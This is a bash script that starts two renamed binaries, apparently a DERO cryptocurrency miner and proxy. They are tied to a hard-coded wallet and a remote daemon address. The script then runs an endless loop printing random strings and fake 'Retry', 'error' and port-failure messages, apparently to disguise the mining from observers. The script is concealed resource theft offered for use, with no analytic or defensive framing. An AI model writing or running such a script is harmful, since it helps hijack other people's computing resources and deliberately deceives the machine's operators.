#!/bin/bash
./gassu -w dero1qysfzhrrt9u6sfxvpgc8lsn5q9slxu92ltmng0ucgrjslhugqfrmgqgzrjf98 -r 127.0.0.1:11111 -p rpc -m 96 >output.log  &
./dor --listen-address=127.0.0.1:11111 --log-interval=6 --nonce --daemon-address=167.172.0.123:10100 >output1.log 

while true; do clear; echo Retry; sleep 1; clear; openssl rand -hex 20; sleep 1; clear; openssl rand -base64 21; sleep 1; clear; echo error; clear; echo echo $RANDOM | base64 | head -c 20; echo; sleep 1; clear; echo Failed to open port = Already-open; sleep 1; clear; cat /proc/sys/kernel/random/uuid | sed 's/[-]//g' | head -c 20; echo; sleep 1; clear; echo Retry; sleep 1; clear; echo echo $RANDOM | md5sum | head -c 20; echo; sleep 1;let "i++";  done
